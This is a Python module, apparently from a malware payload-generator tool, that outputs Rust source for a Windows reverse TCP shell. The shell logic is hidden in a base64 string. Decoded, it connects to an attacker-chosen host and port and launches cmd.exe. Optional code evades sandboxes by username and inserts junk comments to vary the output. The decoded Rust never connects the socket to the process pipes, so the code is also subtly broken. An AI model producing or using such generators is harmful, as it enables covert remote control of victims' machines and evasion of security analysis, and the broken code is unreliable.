# rust payload generator
# basic reverse tcp shell in rust

import base64
from generators.base import BaseGenerator


class RustGenerator(BaseGenerator):
    LANG_ID = "rust"
    LANG_NAME = "Rust (stark)"
    FILE_EXT = ".rs"

    def generate(self, host, port, opts, ptype, tpl, adv):
        sandbox = opts.get("sandbox", False)
        junk = opts.get("junk", False)

        code = "use std::net::TcpStream;\nuse std::process::{Command, Stdio};\nuse std::io::{Read, Write};\n\n"
        code += "fn main() {\n"

        if sandbox:
            code += '    if std::env::var("USERNAME").unwrap_or_default() == "sandbox" { return; }\n'
        if junk:
            code += f"    // {self.rstr(30)}\n"

        code += base64.b64decode(
            "aWYgbGV0IE9rKG11dCBzdHJlYW0pID0gVGNwU3RyZWFtOjpjb25uZWN0KCJ7MH06ezF9Iikg"
            "ewogICAgICAgIGxldCBtdXQgY2hpbGQgPSBDb21tYW5kOjpuZXcoImNtZC5leGUiKQogICAg"
            "ICAgICAgICAuc3RkaW4oU3RkaW86OnBpcGVkKCkpCiAgICAgICAgICAgIC5zdGRvdXQoU3Rk"
            "aW86OnBpcGVkKCkpCiAgICAgICAgICAgIC5zdGRlcnIoU3RkaW86OnBpcGVkKCkpCiAgICAg"
            "ICAgICAgIC5zcGF3bigpCiAgICAgICAgICAgIC5leHBlY3QoImZhaWxlZCIpOwogICAgICAg"
            "IGNoaWxkLndhaXQoKS51bndyYXAoKTsKICAgIH0K"
        ).decode().format(host, port)
        code += "}\n"
        return code
